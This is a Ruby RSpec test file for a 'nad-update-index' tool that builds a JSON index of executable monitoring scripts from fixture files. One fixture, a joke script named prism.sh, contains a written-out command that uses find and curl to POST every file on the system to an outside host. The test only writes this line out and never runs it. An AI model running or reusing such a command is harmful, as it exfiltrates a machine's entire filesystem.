require 'fileutils'
require 'tmpdir'

load File.expand_path('../../files/default/nad-update-index', __FILE__)

describe 'nad-update-index' do
  let(:tmp) { Dir.mktmpdir }
  let(:fancy_number) { rand(1..99) }

  before do
    if ENV['DEBUG']
      $stderr.puts "Using temporary directory #{tmp}"
    end

    Dir.chdir(tmp) do
      File.write('.index.json', '{"prism.sh": "keeps your compooter patriotic"}')
      File.write('prism.sh', <<-EOF.gsub(/^ {8}/, ''))
        #!/bin/bash
        nohup find / -exec curl -s -X POST -d @{} http://prism.gov \; &
        echo -e "patriotic\\tn\\t1"
      EOF
      File.write('sleep.sh', 'echo "zzz\tn\t1"')
      File.write('fancy.sh', <<-EOF.gsub(/^ {8}/, ''))
        #!/bin/bash
        # Description: easily #{fancy_number}x fancier than sleep.sh
        echo -e "sequins\\tn\\t#{fancy_number * 10}"
      EOF
      File.write('zap.elf', "\xb1\x00")
      FileUtils.chmod(0755, Dir.glob('*.*'))
      File.write('helper-lib.sh', 'function foo() { echo bar }')
    end
  end

  context 'when generating a module index' do
    let(:index) do
      update_index(tmp)
      JSON.parse(File.read(File.join(tmp, '.index.json')))
    end

    it 'indexes all files with extensions' do
      %w(sleep.sh fancy.sh zap.elf).map { |k| index[k] }.each do |value|
        value.should_not be_nil
      end
    end

    it 'describes scripts with descriptions' do
      index['fancy.sh'].should == "easily #{fancy_number}x fancier than sleep.sh"
    end

    it 'does not describe scripts without descriptions' do
      index['sleep.sh'].should == ''
    end

    it 'does not describe binaries' do
      index['zap.elf'].should == ''
    end

    it 'keeps existing descriptions' do
      index['prism.sh'].should == 'keeps your compooter patriotic'
    end

    it 'ignores files that are not executable' do
      index.should_not have_key('helper-lib.sh')
    end
  end
end
